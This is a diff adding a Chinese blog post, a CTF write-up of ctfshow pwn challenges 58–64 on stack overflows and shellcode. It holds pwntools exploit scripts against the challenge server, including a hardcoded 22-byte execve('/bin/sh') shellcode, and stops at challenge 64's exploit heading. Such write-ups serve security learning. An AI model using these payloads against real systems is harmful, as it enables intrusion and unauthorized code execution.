@@ -183,6 +183,205 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/30/shellcode1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/30/shellcode1/" class="post-title-link" itemprop="url">shellcode（ctfshow58-64）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-30 21:22:57" itemprop="dateCreated datePublished" datetime="2025-01-30T21:22:57+08:00">2025-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-01-31 12:41:21" itemprop="dateModified" datetime="2025-01-31T12:41:21+08:00">2025-01-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%AC%E4%B8%89%E5%91%A8/" itemprop="url" rel="index"><span itemprop="name">第三周</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ctfshow58"><a href="#ctfshow58" class="headerlink" title="ctfshow58"></a>ctfshow58</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       i386-32-little</span><br><span class="line">   RELRO:      Partial RELRO</span><br><span class="line">   Stack:      No canary found</span><br><span class="line">   NX:         NX unknown - GNU_STACK missing</span><br><span class="line">   PIE:        No PIE (0x8048000)</span><br><span class="line">   Stack:      Executable</span><br><span class="line">   RWX:        Has RWX segments</span><br><span class="line">   Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>32位程序，NX保护没开，栈可以执行</p>
+<p>ida：main函数调用了ctfshow函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    ctfshow</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在gets函数栈溢出，并且gets函数写入的地址 [ebp+s] 在后面会被调用，且栈可以执行，所以我们直接写入shellcode就可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call    _gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    [ebp+s]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">call    eax</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28158</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow59"><a href="#ctfshow59" class="headerlink" title="ctfshow59"></a>ctfshow59</h1><p>这道题与上一道一样只不过是64位的，注意生成shellcode的时候需要注明架构为64位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28306</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow60"><a href="#ctfshow60" class="headerlink" title="ctfshow60"></a>ctfshow60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
+
+<p>32位，NX保护没有开启，栈可以执行</p>
+<p>ida：gets函数存在栈溢出，使用strncpy函数将对应的字符串复制到 buf2 处</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-pwn can u pwn me here!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">100u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;See you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看一下buf2所在的位置</p>
+<p><img src="/2025/01/30/shellcode1/image-20250130214540641.png" alt="image-20250130214540641"></p>
+<p>然后看看bss段是否可执行</p>
+<p><img src="/2025/01/30/shellcode1/image-20250130214637415.png" alt="image-20250130214637415"></p>
+<p>我们看到是不可执行的，但是去看了一下师傅们的wp发现是可执行的，应该是版本的问题</p>
+<p><img src="/2025/01/30/shellcode1/N316WRCUO1533QCK8HZXZW.png" alt="N316WRCUO1533QCK8HZXZW"></p>
+<p><strong>思路：</strong>我们将shellcode写入，然后填充垃圾数据覆盖返回地址为buf2，就可以了，因为strncpy函数会将对应的字符串复制到 buf2 处，所以shellcode也会被复制到buf2</p>
+<p><strong>偏移为：112</strong></p>
+<p>ida是有问题的</p>
+<p><img src="/2025/01/30/shellcode1/image-20250130215539447.png" alt="image-20250130215539447"></p>
+<p><strong>exp：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28249</span>)</span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2)           <span class="comment">#使用 ljust 函数将 shellcode 字符串用a补充到长度为 112</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow61"><a href="#ctfshow61" class="headerlink" title="ctfshow61"></a>ctfshow61</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化</p>
+<p>ida：我们发现 printf函数将v5的地址打印出来了，我们可以将v5的地址接受保存下来，并将shellcode写入v5，再将返回地址覆盖为v5的地址就可以，但是v5到ret_addr的长度只有16字节，而shellcode要32字节，不会了，看一下师傅们的wp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo(v3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  gets(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>原来不只是长度不够，还有leave的问题</p>
+<p><strong>leave的作用相当于MOV SP,BP；POP BP。 因为leave指令会释放栈空间，因此我们不能使用v5后面的24字节</strong></p>
+<p>而且v5后的8个字节也不能存放（这里需要存放返回地址），所以我们只能将shellcode放在v5后的32字节的地方，并将返回地址改为v5后面32字节的地方</p>
+<p><strong>如何接受到v5的正确地址：</strong></p>
+<p><img src="/2025/01/30/shellcode1/image-20250130223204351.png" alt="image-20250130223204351"></p>
+<p>我们可以看到v5的地址实在[]里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)                        <span class="comment">#输入流中首先接收数据直到遇到 &#x27;[&#x27; 字符为止</span></span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)        <span class="comment">#再次接收直到遇到 &#x27;]&#x27; 字符为止</span></span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)                          <span class="comment">#将变量 v5 解析为一个十六进制的整数</span></span><br><span class="line"><span class="comment">#获取到的是字节串,p64()的参数是整形,要把字节串转化成整形</span></span><br><span class="line"><span class="comment"># 不能用hex(int(v5_addr, 16)),因为hex的结果是字符串,不能传给p64()</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>exp：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28114</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v5))                    <span class="comment">#打印v5的十六进制表示</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)         <span class="comment">#溢出到返回地址</span></span><br><span class="line">payload += p64(v5+<span class="number">32</span>)             <span class="comment">#将将返回地址改为v5后面32字节的地方</span></span><br><span class="line">payload += shellcode              <span class="comment">#将shellcode写入到v5后面32字节的地方</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow62"><a href="#ctfshow62" class="headerlink" title="ctfshow62"></a>ctfshow62</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX unknown - GNU_STACK missing</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>64位，NX保护关闭，栈可以执行,开启PIE保护地址随机化</p>
+<p>ida：和上一题一样，只不过read为0x38字节（56），栈空间24，返回地址8不可用，所以最大写入的是56-24-8&#x3D;24，而自动生成的shellcode是0x30，所以不够了，看了一下师傅们的wp，需要找更短的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode =b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;   #22bytes</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  logo(v3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28286</span>)</span><br><span class="line">shellcode =<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v5))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(v5+<span class="number">32</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow63"><a href="#ctfshow63" class="headerlink" title="ctfshow63"></a>ctfshow63</h1><p>ida：和上一题一样，只不过可读入的更少了，只有0x37（55），55-24-8&#x3D;23，上一题用的shellcode为22字节，还可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  __int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  buf[0] = 0LL;</span><br><span class="line">  buf[1] = 0LL;</span><br><span class="line">  v3 = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, 0LL, 1, 0LL);</span><br><span class="line">  logo(v3, 0LL);</span><br><span class="line">  puts(&quot;Welcome to CTFshow!&quot;);</span><br><span class="line">  printf(&quot;What&#x27;s this : [%p] ?\n&quot;, buf);</span><br><span class="line">  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);</span><br><span class="line">  read(0, buf, 0x37uLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28224</span>)</span><br><span class="line">shellcode =<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(v5))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(v5+<span class="number">32</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfshow64"><a href="#ctfshow64" class="headerlink" title="ctfshow64"></a>ctfshow64</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:       i386-32-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x8048000)</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>32位，NX保护开启，栈不可执行</p>
+<p>ida：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x400u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x400u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>首先 buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0)没看懂，搜了一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><strong><code>addr</code></strong></th>
+<th><strong><code>length</code></strong></th>
+<th><strong><code>prot</code></strong></th>
+<th><strong><code>flags</code></strong></th>
+<th><strong><code>fd</code></strong></th>
+<th><strong><code>offset</code></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>指定映射区域的起始地址（则由操作系统选择合适的地址）</td>
+<td>映射区域的大小</td>
+<td>决定映射区域的保护属性（设置为7可读可写可执行）</td>
+<td>决定映射的类型和行为</td>
+<td>文件描述符，用于指定要映射的文件</td>
+<td>文件的偏移量，指定从文件的哪个位置开始映射</td>
+</tr>
+</tbody></table>
+<p>这个题将<code>buf</code> 将被设置为映射区域的起始地址，映射区域的大小为 <code>0x400</code> 字节，保护标志为7（映射的内存区域可以读、写和执行）</p>
+<p>大小0x400，足够写入shellcode，并且可以执行</p>
+<p>在看后面是一个if，是判断是否读取成功，如果 <code>read</code> 返回值小于 <code>0</code>，说明读取失败，并且退出程序</p>
+<p>最后((void (*)(void))buf)()</p>
+<p>将 <code>buf</code> 强制转换为一个函数指针类型，并且调用buf，我们将shellcode写入buf，就会被调用</p>
+<p><strong>exp</strong></p>
